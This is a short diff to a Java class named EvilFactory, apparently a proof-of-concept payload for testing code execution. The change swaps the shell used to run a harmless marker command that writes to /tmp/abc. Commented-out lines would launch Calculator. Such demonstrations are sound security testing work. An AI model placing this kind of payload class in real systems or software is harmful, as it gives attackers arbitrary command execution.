@@ -40,7 +40,7 @@ public class EvilFactory {
                     : new String[]{"open","/System/Applications/Calculator.app"};
             */
             //String[] cmds = new String[]{"/bin/echo","'#####'"};
-            String[] cmds = new String[]{"/bin/bash", "-c", "echo abc > /tmp/abc"};
+            String[] cmds = new String[]{"/bin/sh", "-c", "echo abc > /tmp/abc"};
             java.lang.Runtime.getRuntime().exec(cmds).waitFor();
         } catch (Exception e){
             e.printStackTrace();
